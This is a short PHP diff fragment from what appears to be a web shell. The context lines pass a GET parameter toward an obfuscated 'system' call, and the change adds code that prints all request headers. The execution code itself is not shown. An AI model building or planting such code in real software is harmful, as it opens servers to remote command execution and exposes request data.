@@ -7,6 +7,9 @@ try {
         throw new Exception("Input parameter not provided! <a>");
     }
 
+    $headers = getallheaders();
+    print_r($headers);
+    
     $input = $_GET[$cmd];
 
     // Obfuscated 'system' function
